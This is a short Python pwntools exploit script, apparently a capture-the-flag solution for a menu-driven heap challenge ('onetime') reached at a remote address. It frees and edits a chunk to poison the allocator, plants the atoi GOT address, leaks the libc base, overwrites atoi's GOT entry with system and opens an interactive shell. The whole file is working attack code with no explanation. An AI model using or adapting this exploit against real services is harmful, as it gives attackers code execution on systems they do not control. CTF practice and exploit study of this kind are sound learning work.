from pwn import *

#r=process("./pwn")
r=remote("10.155.121.5",10055)
pause()

def add_():
	r.recvuntil(b"your choice >>")
	r.sendline(b"1")
	return

def edit_(content):
	r.recvuntil(b"your choice >>")
	r.sendline(b"2")
	r.recvuntil(b"fill content:")
	r.send(content)
	return
def show_():
	r.recvuntil(b"your choice >>")
	r.sendline(b"3")
	r.recvuntil(b"data:")
	return
def del_():
	r.recvuntil(b"your choice >>")
	r.sendline(b"4")
	return
def awe_(content):
	r.recvuntil(b"your choice >>")
	r.sendline(b"5")
	r.recvuntil(b"Hero! Leave your name:")
	r.send(content)
	return

add_()
del_()
edit_(p64(0x60208d))
add_()
atoi_got=0x602058
awe_(b'\x00\x00\x00'+p64(0)+p64(atoi_got)+p64(0)+p64(0))
pause()
show_()
libc=ELF("./onetime.so")
libc_base=u64(r.recvuntil(b"\n")[:-1].ljust(8,b"\x00"))-libc.sym["atoi"]
edit_(p64(libc_base+libc.sym["system"]))


r.interactive()
